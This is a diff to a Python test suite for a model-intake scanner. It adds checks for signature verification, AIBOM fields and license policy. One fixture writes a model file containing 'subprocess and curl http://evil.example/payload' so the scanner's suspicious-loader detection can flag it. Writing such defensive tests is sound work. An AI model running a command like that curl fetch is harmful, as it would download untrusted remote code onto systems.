@@ -45,7 +45,10 @@ def test_model_intake_accepts_signed_safetensors_with_provenance(tmp_path):
                 "metadata_json": {
                     "source_repo": "https://github.com/example/model",
                     "commit_sha": "abc123",
+                    "base_model": "example/base-v1",
+                    "tokenizer": "example/tokenizer-v1",
                     "training_data_ref": "dataset:v1",
+                    "sigstore_verified": True,
                     "license": "apache-2.0",
                     "sbom": {"components": []},
                     "malware_scan_result": {"status": "clean"},
@@ -59,6 +62,10 @@ def test_model_intake_accepts_signed_safetensors_with_provenance(tmp_path):
 
     assert result["findings"] == []
     assert result["model_intake"]["summary"]["format_posture"] == "safer_static_format"
+    assert result["model_intake"]["summary"]["aibom_generated"] is True
+    assert result["model_intake"]["summary"]["signature_verification_status"] == "verified"
+    assert result["model_intake"]["aibom"]["completeness"]["fields"]["base_model"] is True
+    assert any(component["type"] == "tokenizer" for component in result["model_intake"]["aibom"]["components"])
     assert result["result"]["grade"] == "A"
     assert result["result"]["decision"] == "allow"
 
@@ -221,3 +228,65 @@ def test_model_intake_flags_missing_governance_metadata(tmp_path):
     assert "model_intake:missing_sbom_or_dependencies" in finding_ids
     assert "model_intake:missing_eval_evidence" in finding_ids
     assert result["model_intake"]["checks"]["malware_scan"] is False
+
+
+def test_model_intake_can_require_signature_verification(tmp_path):
+    artifact = tmp_path / "model.onnx"
+    artifact.write_bytes(b"onnx bytes")
+    expected_sha = hashlib.sha256(artifact.read_bytes()).hexdigest()
+
+    result = asyncio.run(
+        run_model_intake_scan(
+            str(artifact),
+            {
+                "expected_sha256": expected_sha,
+                "signature_url": "https://example.test/model.onnx.sig",
+                "model_card_url": "https://example.test/model-card",
+                "deployment_approved": True,
+                "require_signature_verification": True,
+                "metadata_json": {
+                    "source_repo": "https://github.com/example/model",
+                    "commit_sha": "abc123",
+                    "training_data_ref": "dataset:v1",
+                    "license": "apache-2.0",
+                    "sbom": {"components": []},
+                    "malware_scan_result": {"status": "clean"},
+                    "security_evals": {"status": "passed"},
+                    "deployment_restrictions": ["staging"],
+                    "monitoring_plan": "model-monitoring-v1",
+                },
+            },
+        )
+    )
+
+    finding_ids = {finding["id"] for finding in result["findings"]}
+    assert "model_intake:signature_not_verified" in finding_ids
+    assert result["model_intake"]["checks"]["signature_verification"] is False
+
+
+def test_model_intake_flags_restricted_license_and_loader_markers(tmp_path):
+    artifact = tmp_path / "model.bin"
+    artifact.write_bytes(b"model bytes with subprocess and curl http://evil.example/payload")
+
+    result = asyncio.run(
+        run_model_intake_scan(
+            str(artifact),
+            {
+                "require_deployment_approval": False,
+                "metadata_json": {
+                    "source_repo": "https://github.com/example/model",
+                    "license": "research only non-commercial",
+                    "sbom": {"components": []},
+                    "malware_scan_result": {"status": "clean"},
+                    "security_evals": {"status": "passed"},
+                    "deployment_restrictions": ["staging"],
+                    "monitoring_plan": "model-monitoring-v1",
+                },
+            },
+        )
+    )
+
+    finding_ids = {finding["id"] for finding in result["findings"]}
+    assert "model_intake:restricted_license_policy" in finding_ids
+    assert "model_intake:suspicious_loader_markers" in finding_ids
+    assert result["model_intake"]["supply_chain"]["license_policy"]["status"] == "restricted"
